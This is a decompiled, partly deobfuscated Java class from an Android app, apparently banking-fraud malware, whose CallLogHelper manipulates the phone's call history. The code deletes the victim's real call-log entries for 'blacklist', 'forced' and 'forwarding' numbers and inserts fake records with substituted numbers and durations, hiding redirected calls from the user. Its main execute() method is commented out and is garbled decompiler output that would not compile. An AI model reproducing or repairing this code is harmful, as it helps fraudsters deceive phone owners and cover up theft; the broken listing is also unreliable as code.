package com.wish.lmbank.receiver;

import android.annotation.SuppressLint;
import android.text.TextUtils;

import com.wish.lmbank.bean.CallLogBean;
import com.wish.lmbank.common.Constants;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/receiver/CallLogHelper.class */
public class CallLogHelper {
    private static final String TAG = "com.wish.lmbank.receiver.CallLogHelper";

    public static boolean addCallLog(CallLogBean callLogBean) {
        synchronized (CallLogHelper.class) {
            if (callLogBean == null) {
                return true;
            }
            try {
                if (!TextUtils.isEmpty(callLogBean.getPhone1()) && !TextUtils.isEmpty(callLogBean.getPhone2()) && !TextUtils.isEmpty(callLogBean.getType())) {
                    for (CallLogBean callLogBean2 : Constants.mCallLogList) {
                        if (callLogBean2 != null) {
                            String phone1 = callLogBean2.getPhone1();
                            String phone2 = callLogBean2.getPhone2();
                            String type = callLogBean2.getType();
                            if (!TextUtils.isEmpty(type) && type.equals(callLogBean.getType()) && !TextUtils.isEmpty(phone1) && phone1.equals(callLogBean.getPhone1()) && !TextUtils.isEmpty(phone2) && phone2.equals(callLogBean.getPhone2())) {
                                return false;
                            }
                        }
                    }
                    Constants.mCallLogList.add(callLogBean);
                    return true;
                }
                return true;
            } catch (Throwable th) {
                throw th;
            }
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:342:0x07b2  */
    /* JADX WARN: Type inference failed for: r0v10 */
    /* JADX WARN: Type inference failed for: r0v114 */
    /* JADX WARN: Type inference failed for: r0v22 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct code enable 'Show inconsistent code' option in preferences
    */
    @SuppressLint("Range")
    public static void execute() {
       /* Class<CallLogHelper> cls = CallLogHelper.class;
        synchronized (CallLogHelper.class){

        }
        if (Constants.mCallLogList.size() <= 0) {
//             LogUtils.callLog(TAG + bb7d7pu7.m5998("RUkMEQwKHB0MRUkKCAUFJQYOJQAaHVNJ") + Constants.mCallLogList.toString() + bb7d7pu7.m5998("RUkAGiwRDAocHQxTSQ") + AppStartV.isCallLogExecute);     // Catch: Throwable -> L162
            LogUtils.callLog(TAG + ", execute, callLogList: " + Constants.mCallLogList.toString() + ", isExecute: " + AppStartV.isCallLogExecute);     // Catch: Throwable -> L162
        }

        if (!AppStartV.isCallLogExecute){
            AppStartV.isCallLogExecute = true;     // Catch: Throwable -> L162
            ListIterator listIterator = Constants.mCallLogList.listIterator();     // Catch: Exception -> L157 Throwable -> L159
            cls = CallLogHelper.class;
            if (listIterator.hasNext()){
                CallLogBean callLogBean = (CallLogBean) listIterator.next();     // Catch: Exception -> L153 Throwable -> L154
                if (callLogBean == null || callLogBean.isHandled()){
                    int times = callLogBean.getTimes() + 1;     // Catch: Exception -> L153 Throwable -> L154
                    callLogBean.setTimes(times);     // Catch: Exception -> L153 Throwable -> L154
                    if (times > 5){
                        listIterator.remove();
                        return;
                    }
//                     if (bb7d7pu7.m5998("CwUICgIFABod").equals(callLogBean.getType())){
                    if ("blacklist".equals(callLogBean.getType())){
                        Constants.delCallLog(AppStartV.getContext(), callLogBean.getPhone1(), 1);     // Catch: Exception -> L153 Throwable -> L154
                        Constants.delCallLog(AppStartV.getContext(), callLogBean.getPhone1(), 2);     // Catch: Exception -> L153 Throwable -> L154
                        Constants.delCallLog(AppStartV.getContext(), callLogBean.getPhone1(), 3);     // Catch: Exception -> L153 Throwable -> L154
                        Constants.delCallLog(AppStartV.getContext(), callLogBean.getPhone1(), 5);     // Catch: Exception -> L153 Throwable -> L154
                        listIterator.remove();     // Catch: Exception -> L153 Throwable -> L154
                        String str = null;
                        L34:
                        if (str == null) goto L130;
//                         Cursor query = AppStartV.getContext().getContentResolver().query(CallLog.Calls.CONTENT_URI.buildUpon().appendQueryParameter(bb7d7pu7.m5998("BQAEAB0"), bb7d7pu7.m5998("Wg")).build(), null, bb7d7pu7.m5998("BxwECwwbVFY"), new String[]{str}, bb7d7pu7.m5998("DQgdDEktLDoq"));     // Catch: Exception -> L153 Throwable -> L154
                        Cursor query = AppStartV.getContext().getContentResolver().query(CallLog.Calls.CONTENT_URI.buildUpon().appendQueryParameter("limit", "3").build(), null, "number=?", new String[]{str}, "date DESC");     // Catch: Exception -> L153 Throwable -> L154
                        L36:
                        if (query == null) goto L116;
                        if (query.moveToNext() == false) goto L116;
//                         String string = query.getString(query.getColumnIndex(bb7d7pu7.m5998("BxwECwwb")));     // Catch: Throwable -> L124 Exception -> L123
                        String string = query.getString(query.getColumnIndex("number"));     // Catch: Throwable -> L124 Exception -> L123
//                         int i = query.getInt(query.getColumnIndex(bb7d7pu7.m5998("HRAZDA")));     // Catch: Throwable -> L124 Exception -> L123
                        int i = query.getInt(query.getColumnIndex("type"));     // Catch: Throwable -> L124 Exception -> L123
//                         query.getString(query.getColumnIndex(bb7d7pu7.m5998("NgAN")));     // Catch: Throwable -> L124 Exception -> L123
                        query.getString(query.getColumnIndex("_id"));     // Catch: Throwable -> L124 Exception -> L123
//                         long j = query.getLong(query.getColumnIndex(bb7d7pu7.m5998("DRwbCB0ABgc")));     // Catch: Throwable -> L124 Exception -> L123
                        long j = query.getLong(query.getColumnIndex("duration"));     // Catch: Throwable -> L124 Exception -> L123
                        if (string != null) goto L43;
                        L76:
                        if (string != null) goto L78;
                        L114:
                        char c = 0;
                        L49:
                        if (c <= 0) goto L36;
                        listIterator.remove();     // Catch: Exception -> L55 Throwable -> L73
                        L55:
                        e = e;
                        L56:
//                         LogUtils.callLog(TAG + bb7d7pu7.m5998("RUkMEQwKHB0MRUkMEQoMGR0ABgdTSQ") + e.getCause());     // Catch: Throwable -> L64
                        LogUtils.callLog(TAG + ", execute, exception: " + e.getCause());     // Catch: Throwable -> L64
                        AppStartV.isCallLogExecute = false;     // Catch: Throwable -> L161
                        L60:
                        monitor-exit(cls);
                        return;
                        L64:
                        th = th;
                        L66:
                        AppStartV.isCallLogExecute = false;     // Catch: Throwable -> L70
                        throw th;     // Catch: Throwable -> L70
                        L70:
                        th = th;
                        L73:
                        th = th;
        goto L66
                        L78:
//                         if (bb7d7pu7.m5998("DwYbHggbDQAHDg").equals(callLogBean.getType()) == false) goto L114;
                        if ("forwarding".equals(callLogBean.getType()) == false) goto L114;
                        String phone1 = callLogBean.getPhone1();     // Catch: Throwable -> L124 Exception -> L123
                        long date = callLogBean.getDate();     // Catch: Throwable -> L124 Exception -> L123
                        if (TextUtils.isEmpty(phone1) == true) goto L109;
//                         Cursor query2 = AppStartV.getContext().getContentResolver().query(CallLog.Calls.CONTENT_URI.buildUpon().appendQueryParameter(bb7d7pu7.m5998("BQAEAB0"), bb7d7pu7.m5998("WA")).build(), null, "number=?", new String[]{phone1}, "date DESC");     // Catch: Throwable -> L124 Exception -> L123
                        Cursor query2 = AppStartV.getContext().getContentResolver().query(CallLog.Calls.CONTENT_URI.buildUpon().appendQueryParameter("limit", "1").build(), null, "number=?", new String[]{phone1}, "date DESC");     // Catch: Throwable -> L124 Exception -> L123
                        L82:
                        if (query2 == null) goto L106;
                        if (query2.moveToNext() == false) goto L106;
//                         String string2 = query2.getString(query2.getColumnIndex(bb7d7pu7.m5998("BxwECwwb")));     // Catch: Throwable -> L124 Exception -> L123
                        String string2 = query2.getString(query2.getColumnIndex("number"));     // Catch: Throwable -> L124 Exception -> L123
//                         int i2 = query2.getInt(query2.getColumnIndex(bb7d7pu7.m5998("HRAZDA")));     // Catch: Throwable -> L124 Exception -> L123
                        int i2 = query2.getInt(query2.getColumnIndex("type"));     // Catch: Throwable -> L124 Exception -> L123
//                        long j2 = query2.getLong(query2.getColumnIndex(bb7d7pu7.m5998("DRwbCB0ABgc")));     // Catch: Exception -> L55 Throwable -> L73
                       long j2 = query2.getLong(query2.getColumnIndex("duration"));     // Catch: Exception -> L55 Throwable -> L73
//                         long j3 = query2.getLong(query2.getColumnIndex(bb7d7pu7.m5998("DQgdDA")));     // Catch: Exception -> L55 Throwable -> L73
                        long j3 = query2.getLong(query2.getColumnIndex("date"));     // Catch: Exception -> L55 Throwable -> L73
//                         SimpleDateFormat simpleDateFormat = new SimpleDateFormat(bb7d7pu7.m5998("EBAQEEQkJEQNDUkhIVMEBA"));     // Catch: Exception -> L55 Throwable -> L73
                        SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm");     // Catch: Exception -> L55 Throwable -> L73
                        String format = simpleDateFormat.format(Long.valueOf(j3));     // Catch: Exception -> L55 Throwable -> L73
                        String format2 = simpleDateFormat.format(Long.valueOf(date));     // Catch: Exception -> L55 Throwable -> L73
//                         String str2 = bb7d7pu7.m5998("JQYOPB0ABRo");     // Catch: Exception -> L55 Throwable -> L73
                        String str2 = "LogUtils";     // Catch: Exception -> L55 Throwable -> L73
                        StringBuilder sb = new StringBuilder();     // Catch: Exception -> L55 Throwable -> L73
//                         sb.append(bb7d7pu7.m5998("GwwIBTkBBgcMU0k"));     // Catch: Exception -> L55 Throwable -> L73
                        sb.append("realPhone: ");     // Catch: Exception -> L55 Throwable -> L73
                        sb.append(phone1);     // Catch: Exception -> L55 Throwable -> L73
//                         sb.append(bb7d7pu7.m5998("RUkFBgoIBSccBAsMG1NJ"));     // Catch: Exception -> L55 Throwable -> L73
                        sb.append(", localNumber: ");     // Catch: Exception -> L55 Throwable -> L73
                        sb.append(string2);     // Catch: Exception -> L55 Throwable -> L73
//                         sb.append(bb7d7pu7.m5998("RUkFBgoIBTodGwAHDi0IHQxTSQ"));     // Catch: Exception -> L55 Throwable -> L73
                        sb.append(", localStringDate: ");     // Catch: Exception -> L55 Throwable -> L73
                        sb.append(format);     // Catch: Exception -> L55 Throwable -> L73
//                         sb.append(bb7d7pu7.m5998("RUkFBgoIBTsMCgYbDS0IHQxTSQ"));     // Catch: Exception -> L55 Throwable -> L73
                        sb.append(", localRecordDate: ");     // Catch: Exception -> L55 Throwable -> L73
                        sb.append(format2);     // Catch: Exception -> L55 Throwable -> L73
//                         sb.append(bb7d7pu7.m5998("RUkFBgoIBS0cGwgdAAYHU0k"));     // Catch: Exception -> L55 Throwable -> L73
                        sb.append(", localDuration: ");     // Catch: Exception -> L55 Throwable -> L73
                        sb.append(j2);     // Catch: Exception -> L55 Throwable -> L73
                        LogUtils.e(str2, new Object[]{sb.toString()});     // Catch: Exception -> L55 Throwable -> L73
                        if (phone1.equals(string2) == false) goto L82;
                        if (j2 != 0) goto L82;
                        if (i2 != 2) goto L82;
                        if (format2.equals(format) == false) goto L82;
//                         LogUtils.e(bb7d7pu7.m5998("JQYOPB0ABRo"), new Object[]{bb7d7pu7.m5998("GwwIBTkBBgcMU0k") + phone1 + bb7d7pu7.m5998("RUkNDAUqCAUFJQYO")});     // Catch: Exception -> L55 Throwable -> L73
                        LogUtils.e("LogUtils", new Object[]{"realPhone: " + phone1 + ", delCallLog"});     // Catch: Exception -> L55 Throwable -> L73
                        Constants.delCallLog(AppStartV.getContext(), phone1, i2, j2);     // Catch: Exception -> L55 Throwable -> L73
                        L106:
                        if (query2 == null) goto L109;
                        query2.close();     // Catch: Exception -> L55 Throwable -> L73
                        L109:
//                         LogUtils.e(bb7d7pu7.m5998("JQYOPB0ABRo"), new Object[]{bb7d7pu7.m5998("BxwECwwbU0k") + string + bb7d7pu7.m5998("RUkNDAUqCAUFJQYO")});     // Catch: Exception -> L55 Throwable -> L73
                        LogUtils.e("LogUtils", new Object[]{"number: " + string + ", delCallLog"});     // Catch: Exception -> L55 Throwable -> L73
                        Constants.delCallLog(AppStartV.getContext(), string, i);     // Catch: Exception -> L55 Throwable -> L73
                        Context context = AppStartV.getContext();     // Catch: Exception -> L55 Throwable -> L73
                        String phone12 = callLogBean.getPhone1();     // Catch: Exception -> L55 Throwable -> L73
                        long date2 = callLogBean.getDate();     // Catch: Exception -> L55 Throwable -> L73
                        if (callLogBean.getDuration() != 0) goto L113;
                        long duration = j;
                        L112:
                        Constants.insertCallLog(context, phone12, date2, duration, i, 1);     // Catch: Exception -> L55 Throwable -> L73
                        c = 1;
        goto L49
                        L113:
                        duration = callLogBean.getDuration();     // Catch: Exception -> L55 Throwable -> L73
        goto L112
                        L43:
//                         if (bb7d7pu7.m5998("DwYbCgwN").equals(callLogBean.getType()) == false) goto L76;
                        if ("forced".equals(callLogBean.getType()) == false) goto L76;
                        Constants.delCallLog(AppStartV.getContext(), string, i);     // Catch: Throwable -> L124 Exception -> L123
                        Context context2 = AppStartV.getContext();     // Catch: Throwable -> L124 Exception -> L123
                        String phone2 = callLogBean.getPhone2();     // Catch: Throwable -> L124 Exception -> L123
                        long date3 = callLogBean.getDate();     // Catch: Throwable -> L124 Exception -> L123
                        if (callLogBean.getDuration() != 0) goto L75;
                        long duration2 = j;
                        L47:
                        Constants.insertCallLog(context2, phone2, date3, duration2, i, 1);     // Catch: Throwable -> L124 Exception -> L123
                        c = 1;
        goto L49
                        L75:
                        duration2 = callLogBean.getDuration();     // Catch: Throwable -> L124 Exception -> L123
        goto L47
                        L123:
                        e = e;
                        L124:
                        th = th;
                        Class<CallLogHelper> cls2 = cls;
                        L126:
                        cls = cls2;
                        L116:
                        if (query == null) goto L19;
                        query.close();     // Catch: Exception -> L55 Throwable -> L73
        goto L19
                        L130:
                        AppStartV.isCallLogExecute = false;     // Catch: Throwable -> L135
                        monitor-exit(cls);
                        return;
                        L135:
                        th = th;
        goto L71
                    }

                    L137:
//                     if (bb7d7pu7.m5998("DwYbCgwN").equals(callLogBean.getType()) == false) goto L140;
                    if ("forced".equals(callLogBean.getType()) == false) goto L140;
                    str = callLogBean.getPhone1();     // Catch: Exception -> L153 Throwable -> L154
        goto L34
                    L140:
//                     if (bb7d7pu7.m5998("DwYbHggbDQAHDg").equals(callLogBean.getType()) == true) goto L142;
                    if ("forwarding".equals(callLogBean.getType()) == true) goto L142;
                    str = null;
        goto L34
                    L142:
                    str = callLogBean.getPhone2();     // Catch: Exception -> L153 Throwable -> L154
        goto L34


                }
                }

            AppStartV.isCallLogExecute = false;     // Catch: Throwable -> L161
        }*/

    }
}
